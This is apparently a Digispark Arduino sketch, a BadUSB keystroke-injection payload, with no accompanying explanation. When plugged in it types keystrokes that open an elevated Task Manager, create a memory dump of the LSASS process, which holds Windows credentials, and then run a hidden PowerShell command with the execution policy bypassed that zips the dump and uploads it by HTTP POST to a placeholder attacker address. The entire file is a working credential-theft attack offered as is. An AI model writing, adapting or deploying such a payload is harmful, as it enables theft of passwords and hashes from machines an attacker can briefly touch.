#include "DigiKeyboard.h"

void setup() {
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(600);
    DigiKeyboard.print("taskmgr");
    DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_SHIFT_LEFT, MOD_CONTROL_LEFT);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
    DigiKeyboard.delay(5000);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.print("local");
    DigiKeyboard.sendKeyStroke(KEY_F10, MOD_SHIFT_LEFT);
    DigiKeyboard.delay(1200);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ARROW_DOWN);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(3500);
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
    DigiKeyboard.delay(700);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(700);
    DigiKeyboard.print("powershell -ep bypass /w 1 /C $t=$env:temp;$l='lsass.DMP';compress-archive -path $t\$l -destinationpath $t\a.zip;iwr <attacker's-ip>/i.php -method POST -infile $t\a.zip");
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}